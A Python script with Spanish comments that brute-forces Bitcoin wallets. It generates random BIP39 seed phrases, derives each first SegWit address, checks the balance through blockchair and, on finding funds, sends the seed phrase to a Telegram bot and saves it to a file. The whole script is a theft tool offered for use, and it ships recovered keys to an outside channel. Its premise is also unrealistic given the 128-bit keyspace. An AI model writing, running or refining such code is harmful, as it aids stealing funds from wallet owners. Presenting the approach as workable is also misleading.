import os
import time
import requests
from bitcoinlib.mnemonic import Mnemonic
from bitcoinlib.keys import Key
from bitcoinlib.services.services import Service

# ============================================
# CONFIGURACIÓN
# ============================================
# Intentos por hora: 100 => 3600/100 = 36 segundos entre intentos
DELAY_SECONDS = 36

# Límite total de intentos (0 = infinito)
MAX_ATTEMPTS = 0

# Red y derivación (SegWit nativo es el más común hoy)
DERIVATION_PATH = "m/84'/0'/0'/0/0"
NETWORK = 'bitcoin'
PROVIDER = 'blockchair'  # Cambiar si se prefiere otro

# Telegram (variables de entorno)
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

# Archivo de progreso (opcional, para reinicios)
PROGRESS_FILE = "progress.txt"
FOUND_FILE = "found_wallet.txt"

# ============================================
# FUNCIONES
# ============================================

def enviar_telegram(mensaje):
    """Envía un mensaje al chat de Telegram."""
    if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID:
        print("⚠️  Telegram no configurado.")
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": mensaje}, timeout=10)
    except Exception as e:
        print(f"Error al enviar a Telegram: {e}")

def cargar_progreso():
    """Lee el número de intentos ya realizados."""
    if os.path.exists(PROGRESS_FILE):
        with open(PROGRESS_FILE, "r") as f:
            return int(f.read().strip())
    return 0

def guardar_progreso(contador):
    with open(PROGRESS_FILE, "w") as f:
        f.write(str(contador))

def verificar_seed(seed_phrase):
    """Deriva la primera dirección y consulta su saldo."""
    try:
        mnemonic = Mnemonic()
        seed_bytes = mnemonic.to_seed(seed_phrase)
        key = Key(seed=seed_bytes, network=NETWORK)
        key.derive(DERIVATION_PATH)
        direccion = key.address()
        service = Service(provider=PROVIDER)
        balance = service.getbalance(direccion)
        return direccion, balance
    except Exception as e:
        return None, None

def notificar_estado(intentos, encontrados, ultima_direccion, ultimo_balance):
    """Envía un resumen por Telegram cada hora."""
    mensaje = (
        f"📊 *Estado del escáner* (hora)\n"
        f"Intentos realizados: {intentos}\n"
        f"Carteras encontradas con saldo: {encontrados}\n"
        f"Última dirección chequeada: {ultima_direccion[:12] if ultima_direccion else 'N/A'}...\n"
        f"Último balance: {ultimo_balance if ultimo_balance is not None else 'N/A'} satoshis\n"
        f"Próximo intento en {DELAY_SECONDS} segundos."
    )
    enviar_telegram(mensaje)

# ============================================
# BUCLE PRINCIPAL
# ============================================

def main():
    print("🔄 Iniciando escáner de seeds (100 intentos/hora)")
    print(f"   Retraso entre intentos: {DELAY_SECONDS} segundos")
    print(f"   Máximo de intentos: {'Infinito' if MAX_ATTEMPTS == 0 else MAX_ATTEMPTS}")
    print("=" * 50)

    # Inicializar
    mnemonic = Mnemonic()
    intentos = cargar_progreso()
    encontrados = 0
    ultima_direccion = None
    ultimo_balance = None

    # Variables para control de hora
    hora_inicio = time.time()

    while MAX_ATTEMPTS == 0 or intentos < MAX_ATTEMPTS:
        intentos += 1

        # 1. Generar seed
        seed_phrase = mnemonic.generate(strength=128)
        
        # 2. Verificar saldo
        direccion, balance = verificar_seed(seed_phrase)
        ultima_direccion = direccion
        ultimo_balance = balance

        # 3. Mostrar progreso en consola (cada 10 intentos)
        if intentos % 10 == 0:
            print(f"[{intentos}] {direccion[:12] if direccion else 'Error'} | Balance: {balance if balance is not None else 'N/A'} sat")

        # 4. Si encuentra fondos, notificar inmediatamente
        if balance is not None and balance > 0:
            btc = balance / 100_000_000
            mensaje = (
                f"🎉 *¡WALLET ENCONTRADA!*\n"
                f"Intento: {intentos}\n"
                f"Seed: `{seed_phrase}`\n"
                f"Dirección: `{direccion}`\n"
                f"Balance: {btc} BTC ({balance} satoshis)"
            )
            enviar_telegram(mensaje)
            encontrados += 1
            # Guardar en archivo
            with open(FOUND_FILE, "a") as f:
                f.write(f"{time.ctime()}\n{mensaje}\n\n")
            # Si se desea detener tras encontrar, descomentar:
            # break

        # 5. Guardar progreso (para reinicios)
        guardar_progreso(intentos)

        # 6. Esperar el tiempo configurado
        time.sleep(DELAY_SECONDS)

        # 7. Notificar estado cada hora (3600 segundos)
        if time.time() - hora_inicio >= 3600:
            notificar_estado(intentos, encontrados, ultima_direccion, ultimo_balance)
            hora_inicio = time.time()  # Reiniciar contador de hora

    # Si el bucle termina por límite alcanzado
    mensaje_final = f"✅ Escáner finalizado tras {intentos} intentos. Wallets encontradas: {encontrados}"
    enviar_telegram(mensaje_final)
    print(mensaje_final)

if __name__ == "__main__":
    main()
